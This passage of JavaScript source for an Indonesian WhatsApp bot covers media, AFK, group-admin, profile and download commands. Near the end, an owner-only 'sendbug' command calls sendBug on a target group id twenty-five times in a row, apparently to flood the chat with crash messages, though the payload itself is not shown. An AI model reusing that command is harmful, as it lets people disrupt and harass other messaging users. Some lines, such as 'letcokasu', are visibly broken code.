if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let detikvn = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let dvn = await surya.downloadAndSaveMediaMessage(detikvn)
let cokmatane = Number(args[1])
let hah = fs.readFileSync(dvn)
surya.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:msg})
fs.unlinkSync(dvn)
limitAdd(sender, limit)
break
case 'detikvideo':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let detikvideo = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let dvideo = await surya.downloadAndSaveMediaMessage(detikvideo)
letcokasu = Number(args[1])
let hancok = fs.readFileSync(dvideo)
surya.sendMessage(from, hancok, video, {mimetype: 'video/mp4', duration: cokasu, quoted: msg})
fs.unlinkSync(dvideo)
limitAdd(sender, limit)
break

case 'tovn':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isAudio || isQuotedAudio) {
let vnnya = isQuotedAudio ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let vny = await surya.downloadMediaMessage(vnnya)
surya.sendMessage(from, vny, audio, {ptt:true})
limitAdd(sender, limit)
}
break

case 'delete':
case 'del':
case 'd':
if (!isGroup)return reply(mess.OnlyGrup)
if (!isOwner && !isOwner2)return mentions(mess.OnlySurya, [Suryaa], true)
if (!isQuotedMsg) return textImg(`Reply pesan dari bot`)
if (!quotedMsg.fromMe) return textImg(`Reply pesan dari bot`)
surya.deleteMessage(from, { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
break

case 'online':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (isMuted) return
if (isBan) return 
offline = false
fakestatus('```ANDA TELAH ONLINE```')
break
 case 'offline':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (isMuted) return
if (isBan) return 
offline = true
waktu = Date.now()
let anuu = q ? q : 'ɢᴀᴋ ᴀᴅᴀ ʏᴀɴɢ sᴀʏᴀɴɢ :)'
alasanafk = anuu
fakestatus('```ANDA TELAH OFFLINE```')
break

case 'afk':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
//if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (!isGroup) return reply(mess.OnlyGrup)
if (isAfkOn) return reply('Afk sudah diaktifkan sebelumnya')
if (body.slice(10000)) return reply('Alasanlu kepanjangan')
let reason = q ? q : 'Tidak ada'
afk.addAfkUser(sender, Date.now(), reason, _afk)
//let waktuya = moment(msg.messageTimestamp * 1000).format('HH:mm:ss DD•MM•YYYY')
let Wit = moment.tz('Asia/Jakarta').format('HH:mm:ss DD•MM•YYYY')
let textAfk = `
_*${pushname} [@${sender.split('@')[0]}] sedang AFK*_

_*Alasan :*_ ${reason}
_*Sejak : ${Wit}*_`
const tombol = [{buttonId: 'arigatou', buttonText: {displayText: `Cepat kembali ${pushname}`}, type: 1}]
const tombolMessage = {
contentText: `${textAfk}`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: tombol,
headerType: 1
}
surya.sendMessage(from, tombolMessage, MessageType.buttonsMessage, {contextInfo: { forwardingScore: 100000, isForwarded: true, mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted : msg})

gameAdd(sender, glimit)
break
case 'off':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (isMuted) return
if (isBan) return 
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
//if (!isGroup) return reply(mess.OnlyGrup)
if (isAfkOn) return reply('Afk sudah diaktifkan sebelumnya')
if (body.slice(10000)) return reply('Alasanlu kepanjangan')
let alasan = q ? q : 'Tidak ada'
afk.addAfkUser(sender, Date.now(), alasan, _afk)
let waktunya = moment(msg.messageTimestamp * 1000).format('HH:mm:ss DD•MM•YYYY')
let teksAfk = `
_*${pushname} [@${sender.split('@')[0]}] sedang AFK*_

_*Alasan :*_ ${alasan}
_*Sejak : ${waktunya}*_`
const tmbl = [{buttonId: 'sedih', buttonText: {displayText: 'Okey Stah Surya'}, type: 1}]
const tmblMessage = {
contentText: `${teksAfk}`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: tmbl,
headerType: 1
}
surya.sendMessage(from, tmblMessage, MessageType.buttonsMessage, {contextInfo: { forwardingScore: 100000, isForwarded: true, mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
gameAdd(sender, glimit)
break

 case 'add': case '+':
 if (!isGroup) return reply(mess.OnlyGrup)
 if (command.split(prefix)[1] === 'oadd' && !isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
 if (!isGroupAdmins && !isPremium)return reply(mess.GrupAdmin)
 if (!isBotGroupAdmins) return reply(mess.BotAdmin)
 try {
var pic = await surya.getProfilePicture(from)
 } catch {
var pic = 'https://i.ibb.co/t2m9fFt/88876ba5bb74.jpg'
 }
 var pepeqq = await getBuffer(pic)
if (isQuotedMsg && args.length < 2) {
surya.groupAdd(from, [quotedMsg.sender])
.then((res) => {
if (res.participants[0][quotedMsg.sender.split("@")[0] + '@c.us'].code === "403"){
let au = res.participants[0][quotedMsg.sender.split("@")[0] + '@c.us']
surya.sendMessage(quotedMsg.sender, { groupName: groupName, groupJid: from, inviteCode: au.invite_code, inviteExpiration: au.invite_code_exp, caption: `Invited By Mecha Botz`, jpegThumbnail: pepeqq }, groupInviteMessage)
reply(`Mengirimkan groupInvite kepada nomor tersebut`)
} else if (res.participants[0][quotedMsg.sender.split("@")[0] + '@c.us'].code === "408"){
reply(`Gagal menambahkan peserta dengan alasan: *Dia baru keluar group baru baru ini*`)
} else if (res.participants[0][quotedMsg.sender.split("@")[0] + '@c.us'].code === "401"){
reply(`Gagal menambahkan peserta dengan alasan: *Bot di block oleh yang bersangkutan*`)
} else {
reply(mess.success)
}
})
.catch((err) => reply(mess.error.api))
 } else if (args.length < 3 && !isNaN(args[1])){
surya.groupAdd(from, [args[1] + '@s.whatsapp.net'])
.then((res) => {
if (res.participants[0][args[1] + '@c.us'].code === "403"){
let au = res.participants[0][args[1] + '@c.us']
surya.sendMessage(args[1] + '@s.whatsapp.net', { groupName: groupName, groupJid: from, inviteCode: au.invite_code, inviteExpiration: au.invite_code_exp, caption: `Invited By ChikaBot`, jpegThumbnail: pepeqq }, groupInviteMessage)
reply(`Mengirimkan groupInvite kepada nomor tersebut`)
} else if (res.participants[0][args[1] + '@c.us'].code === "408"){
reply(`Gagal menambahkan peserta dengan alasan: *Dia baru keluar group baru baru ini*`)
} else if (res.participants[0][args[1] + '@c.us'].code === "401"){
reply(`Gagal menambahkan peserta dengan alasan: *Bot di block oleh yang bersangkutan*`)
} else {
reply(mess.success)
}
})
.catch((err) => reply(mess.error.api))
} else {
reply(`Kirim perintah ${prefix}add nomor atau reply pesan orang yang ingin di add`)
 }
 break

case 'kick':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2)return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentioned.length !== 0){
surya.groupRemove(from, mentioned)
} else if (isQuotedMsg) {
if (quotedMsg.sender === Suryaa) return textImg(`Tidak bisa kick Owner`)
surya.groupRemove(from, [quotedMsg.sender])
textImg(`Sukses mengeluarkan member`)
} else if (!isNaN(args[1])) {
surya.groupRemove(from, [args[1] + '@s.whatsapp.net'])
textImg(`*Kirim perintah ${prefix}kick @tag atau nomor atau reply pesan orang yang ingin di kick*`)
}
break
case 'promote': case 'pm':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentioned.length !== 0){
surya.groupMakeAdmin(from, mentioned)
} else if (isQuotedMsg) {
surya.groupMakeAdmin(from, [quotedMsg.sender])
textImg(`Sukses promote member`)
} else if (!isNaN(args[1])) {
surya.groupMakeAdmin(from, [args[1] + '@s.whatsapp.net'])
textImg(`Kirim perintah ${prefix}promote @tag atau nomor atau reply pesan orang yang ingin di promote`)
}
break
case 'demote': case 'dm':
if (isMuted) return
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentioned.length !== 0){
surya.groupDemoteAdmin(from, mentioned)
} else if (isQuotedMsg) {
if (quotedMsg.sender === Suryaa) return textImg(`Tidak bisa kick Owner`)
surya.groupDemoteAdmin(from, [quotedMsg.sender])
textImg(`Sukses demote member`)
} else if (!isNaN(args[1])) {
surya.groupDemoteAdmin(from, [args[1] + '@s.whatsapp.net'])
textImg(`Kirim perintah ${prefix}demote @tag atau nomor atau reply pesan orang yang ingin di demote`)
}
break
case 'linkgc': case 'linkgrup': case 'linkgroup':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
surya.groupInviteCode(from)
.then((res) => textImg('https://chat.whatsapp.com/' + res))
break

case 'leave':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2)return reply(mess.GrupAdmin)
reply(`Mecha Botz`)
reply(`Bot WhatsApp Pintar`)
reply(`Misi Terakhir. . .`)
reply(`*SELESAI*`)
await sleep(8000)
.then(() => surya.groupLeave(from))
break

case 'setdesc': case 'setdesk':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2)return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (args.length === 1) return textImg(`Penggunaan ${prefix}setdesc desc`)
surya.groupUpdateDescription(from, q)
textImg(`Sukses mengganti deskripsi grup`)
break
case 'setgrupname':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2)return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (args.length === 1) return textImg(`Penggunaan ${prefix}setgrupname name`)
surya.groupUpdateSubject(from, q)
textImg(`Sukses mengganti nama grup menjadi ${q}`)
break
case 'sider': case 'chatinfo':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isQuotedMsg) return textImg(`Reply pesan dari bot`)
if (!quotedMsg.fromMe) return textImg(`Reply pesan dari bot`)
surya.messageInfo(from, msg.message.extendedTextMessage.contextInfo.stanzaId)
.then((res) => {
let anu = []
let txt = `*Info Chat*\n\n`
for (let i = 0; i < res.reads.length; i++){
anu.push(res.reads[i].jid)
txt += `@${res.reads[i].jid.split("@")[0]}\n`
txt += `Waktu membaca : ${moment(`${res.reads[i].t}` * 1000).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
mentions(txt, anu, true)
})
.catch((err) => reply(jsonformat(err)))
break

/*case 'sider':
        if (!m.quoted) throw `Reply pesan dari bot!`;
        let members = m.quoted.chat.endsWith("g.us")
          ? (await surya.groupMetadata(m.quoted.chat)).participants.length - 1
          : m.quoted.chat.endsWith("@broadcast")
          ? -1
          : 1;
        let { reads, deliveries } = await surya.messageInfo(
          m.quoted.chat,
          m.quoted.id)
surya.messageInfo(from, msg.message.extendedTextMessage.contextInfo.stanzaId)
.then((res) => {
let anu1 = []
let txt1 = `*Info Chat*\n\n`
for (let i = 0; i < res.reads.length; i++){
anu1.push(res.reads[i].jid)
txt1 += `@${res.reads[i].jid.split("@")[0]}\n`
txt1 += `Waktu membaca : ${moment(`${res.reads[i].t}` * 1000).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
txt1 += `${members > 1 ? `${members - reads.length} Tersisa` : ""}

*Tersampaikan ke:*
${deliveries.sort((a, b) => b.t - a.t).map(({ jid, t }) => `${jid.split`@`[0]}
${formatDate(t * 1000)}`)
.join("\n")}
${members > 1 ? `${members - reads.length - deliveries.length} tersisa` : ""}
`.trim()
}
mentions(txt1, anu1, true)
})
.catch((err) => reply(jsonformat(err)))
break*/

case 'bukatime': case 'opentime':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!q) return reply(`Masukkan angka!
contoh ${command} 1

*Note :* 1 = 1 menit`)
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2 && !fromMe)return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return textImg(mess.BotAdmin)
let angkaa = args[1].toString()
let reasonn = q.slice(args[1].length + 1, q.length)
reply(`Grup akan dibuka dalam ${angkaa} menit lagi`)
let bukanya = angkaa * 60 * 1000
setTimeout( () => {
reply(`Tepat waktu membuka grup ${groupName} oleh @${sender.split("@")[0]}
Alasan : ${reasonn}`, {contextInfo: {"mentionedJid": [sender]}})
}, `${bukanya}`)
await sleep(bukanya)
surya.groupSettingChange(from, "announcement", false)
break

case 'closetime': case 'tutuptime':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!q) return reply(`Masukkan angka!
contoh ${command} 1

*Note :* 1 = 1 menit`)
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2 && !fromMe)return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
let angkanya = args[1].toString()
let alasann = q.slice(args[1].length + 1, q.length)
reply(`Grup akan ditutup dalam ${angkanya} menit lagi`)
let tutupnya = angkanya * 60 * 1000
setTimeout( () => {
reply(`Tepat waktu menutup grup ${groupName} oleh @${sender.split("@")[0]}
Alasan : ${alasann}`, {contextInfo: {"mentionedJid": [sender]}})
}, `${tutupnya}`)
await sleep(tutupnya)
surya.groupSettingChange(from, "announcement", true)
break

case 'opengrup': case 'bukagc': case 'ogc':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2)return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
surya.groupSettingChange(from, "announcement", false)
break
case 'closegrup': case 'tutupgc': case 'cgc':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
surya.groupSettingChange(from, "announcement", true)
break
case 'setppgrup': case 'setppgc':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
//if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (isImage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let media = await surya.downloadMediaMessage(encmedia)
surya.updateProfilePicture(from, media)
textImg(`Sukses mengganti profil grup`)
} else {
textImg(`Kirim atau tag gambar dengan caption ${prefix}setppgrup`)
}
break

case 'join':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
//if (args.length < 2) return textImg(`Kirim perintah *${prefix}join* link grup`)
if (isQuotedMsg){
if (!isUrl(quotedMsg.chats) && !quotedMsg.chats.includes('chat.whatsapp.com')) return reply(mess.error.Iv)
let kode = quotedMsg.chats.replace('https://chat.whatsapp.com/', '')
surya.acceptInvite(kode)
textImg(`Sukses bergabung menggunakan tautan itu`)
if (!isUrl(args[1]) && !args[1].includes('chat.whatsapp.com')) return reply(mess.error.Iv)
let code = args[1].replace('https://chat.whatsapp.com/', '')
surya.acceptInvite(code)
textImg(`Sukses bergabung menggunakan tautan itu`)
}
break

case 'profile': case 'profil':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
try {
var ppimg = await surya.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
var ppimg = 'https://i.ibb.co/t2m9fFt/88876ba5bb74.jpg'
}
let cekprm = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
const prmm = isPremium ? `${cekprm.days} day ${cekprm.hours} hour ${cekprm.minutes} minute ${cekprm.seconds} second`:'Not Premium'
let uLevels = level.getLevelingLevel(sender, _level)
let uExp = level.getLevelingXp(sender, _level)
let rExp = 10 * Math.pow(uLevels, 2) + 50 * uLevels + 100
let uRanks = level.getUserRank(sender, _level)
let shsts = await surya.getStatus(sender)
//${(shsts.status === '') ? 'Nothing' : shsts.status}
let initeks = `
❒ *「 Profile User Mecha Botz 」*
├ *Nama :* ${pushname}
├ *Info kontak :* ${(shsts.status === '401') ? 'Nothing' : shsts.status}
├ *Tag :* @${sender.split("@")[0]}
├ *Status :* ${isPremium ? 'Premium' : 'Gratisan'}
├ *Status Bot :* ${isOwner ? 'Owner' : 'User'}
├ *Expired prem :* ${prmm}
├ *Limit :* ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}
├ *Limit Game :* ${cekGLimit(sender, gcount, glimit)}/${gcount}
├ *Balance :* $${getBalance(sender, balance)}
├ *Level :* ${uLevels}
├ *Exp :* ${uExp} / ${rExp}
├ *Rank :* ${rank}
└ *Top rank :* ${uRanks}`
let srya = await getBuffer (ppimg)
surya.sendMessage(from, srya, image, {contextInfo: { forwardingScore: 9999, isForwarded: false, mentionedJid: [sender]},quoted: msg, caption: initeks})
limitAdd(sender, limit)
break
case 'me':
if (isMuted) return
if (isBan) return 
let biokon = await surya.getStatus(sender, MessageType.text)
reply(biokon.status)
if (p.status == 401) {
reply(`_Error! mungkin diprivate_`)
}
break
case 'listgrup': case 'gruplist': case 'listgc':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const txs = surya.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`
*Nama Group :* ${surya.getName(v.jid)}
*Id Group :* ${v.jid}
*Status :* ${v.read_only ? 'Left' : 'Joined'}`).join`\n\n`
reply('*List Group*\n\n' + txs)
limitAdd(sender, limit)
break

case 'totag': case 'f':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!fromMe && !isOwner2 && !isOwner)return mentions(`Perintah ini hanya khusus @${Suryaa.split('@')[0]} dan @${Mecha.split('@')[0]}`, [Suryaa, Mecha], true)
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!isGroup) return reply(mess.OnlyGrup)
let tagnya = msg.message.extendedTextMessage.contextInfo.quotedMessage.conversation
var group = await surya.groupMetadata(from)
var member = group['participants']
var mem = []
member.map( async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: tagnya,
contextInfo: { mentionedJid: mem },
quoted: msg
}
if (isSticker || isQuotedSticker) {
let stiknya = isQuotedSticker ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let stk = await surya.downloadMediaMessage(stiknya)
surya.sendMessage(from, stk, sticker, options)
} else if (isImage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let meda = await surya.downloadMediaMessage(encmedia)
surya.sendMessage(from, meda, image, options)
} else if (isVideo || isQuotedVideo) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let mevid = await surya.downloadMediaMessage(encmedia)
surya.sendMessage(from, mevid, video, options)
} else if (isAudio || isQuotedAudio) {
let audionya = isQuotedAudio ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let mp3nya = await surya.downloadMediaMessage(audionya)
surya.sendMessage(from, mp3nya, audio, options)
} else if (isQuotedMsg) {
surya.sendMessage(from, quotedMsg.chats, text, options)
limitAdd(sender, limit)
}
break

case 'getpic': case 'getpp':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (msg.message.extendedTextMessage != undefined){
let ppnya = msg.message.extendedTextMessage.contextInfo.mentionedJid
try {
var pic = await surya.getProfilePicture(ppnya[0])
} catch {
var pic = 'https://i.ibb.co/t2m9fFt/88876ba5bb74.jpg'
}
//let thumb = await getBuffer(pic)
surya.sendMessage(from, await getBuffer(pic), image, {thumbnail: suryaImg, sendEphemeral: true, quoted:msg, contextInfo : {forwardingScore: 100, isForwarded: true}})
limitAdd(sender, limit)
}
break

case 'getbio': 
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 1) return reply('Tag orangnya!')
let ments = msg.message.extendedTextMessage.contextInfo.mentionedJid[0]
let p = await surya.getStatus(`${ments}`, MessageType.text)
textImg(p.status)
if (p.status == 401) {
textImg(`_Bio orang tersebut tidak ada_`)
limitAdd(sender, limit)
}
break

case 'mediafire': case 'mfire':
 if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
 if (args.length < 1) return reply('Link Nya Mana? ')
 //if(!isUrl(args[1]) && !args[1].includes('mediafire')) return reply(mess.error.Iv)
 reply(mess.wait)
 let mediaf = args[1]
 let resfire = await mediafireDl(mediaf)
 let resultfire = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *MEDIAFIRE DOWNLOAD*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`🐥 Nama : ${resfire[0].nama}\`\`\`
\`\`\`🐤 Ukuran : ${resfire[0].size}\`\`\`
\`\`\`🐣 Link : ${resfire[0].link}\`\`\`

_*Tunggu Proses Upload Media......*_`
 reply(resultfire)
 sendFileFromUrl(from, resfire[0].link, mess.success, msg)
 break

case 'notif':
if (!isGroupAdmins && !fromMe && !isOwner2) return reply(mess.GrupAdmin)
if (!isGroup) return reply(mess.OnlyGrup)
var tek = `Notif dari @${sender.split("@")[0]}\n*Pesan :* ${body.slice(6)}`
var group = await surya.groupMetadata(from);
var member = group['participants']
let jids = [];
member.map(async adm => {
jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
text: tek,
contextInfo: {
mentionedJid: jids
},
quoted: floc
}
surya.sendMessage(from, options, text)
break
case 'creategrup': case 'creategroup': case 'createg':
argz = arg.includes('|')
if (msg.message.extendedTextMessage != undefined){
let menti = msg.message.extendedTextMessage.contextInfo.mentionedJid
let anji = surya.groupCreate(argz[0])
textImg(from, JSON.stringify(anji), msg)
} else {
reply(from, `Penggunaan ${prefix}creategrup namagrup|@tag`, msg)
}
break

case 'listblock': case 'listblok':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!fromMe && !isOwner2 && !isOwner) return mentions(`Perintah ini hanya khusus @${ownerS} !`, [`${ownerS}@s.whatsapp.net`], true)
let blocked = surya.blocklist.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != surya.user.jid)
surya.sendMessage(from, `*List Block Mecha Botz*` + `\n\n` + blocked.map((v, i) => `➪ ${i + 1}. @${v.split`@`[0]}`).join`\n` + `\n`, text,{ contextInfo: { mentionedJid: blocked } })
break

case 'sendbug':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!fromMe && !isOwner2 && !isOwner) return mentions(`Perintah ini hanya khusus @${ownerS} !`, [`${ownerS}@s.whatsapp.net`], true)
if (isBan) return 
if (args.length < 2) return reply(`Penggunaan ${command} idgroup`)
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
